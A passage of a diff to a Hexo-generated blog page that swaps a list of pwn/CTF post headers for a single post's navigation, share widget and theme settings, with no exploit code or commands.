+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/10/17/noshow-nofree/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/08/07/dasctf7%E6%9C%88pwn%E6%80%BB%E7%BB%93/" class="archive-article-date">
-  	<time datetime="2020-08-07T08:10:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-07</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2020/08/07/dasctf7%E6%9C%88pwn%E6%80%BB%E7%BB%93/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">dasctf7月pwn总结</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/08/07/dasctf7%E6%9C%88pwn%E6%80%BB%E7%BB%93/">dasctf7月pwn总结</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/" class="archive-article-date">
-  	<time datetime="2020-07-10T06:13:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-10</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/">dasctf5月pwn部分总结</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/29/dir/" class="archive-article-date">
-  	<time datetime="2020-05-29T09:36:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-29</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/29/dir/">shellcode搜索文件</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/08/pwn%E4%B9%8Blgd/" class="archive-article-date">
-  	<time datetime="2020-05-08T10:24:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-08</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/08/pwn%E4%B9%8Blgd/">pwn之lgd</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/27/2020-4-26-iofile/" class="archive-article-date">
-  	<time datetime="2020-04-27T12:55:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-27</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/27/2020-4-26-iofile/">iofile</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -403,9 +407,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
